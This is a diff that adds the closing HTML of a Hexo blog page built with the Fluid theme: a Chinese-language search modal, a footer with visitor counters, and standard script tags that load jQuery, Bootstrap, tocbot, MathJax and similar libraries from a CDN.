+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
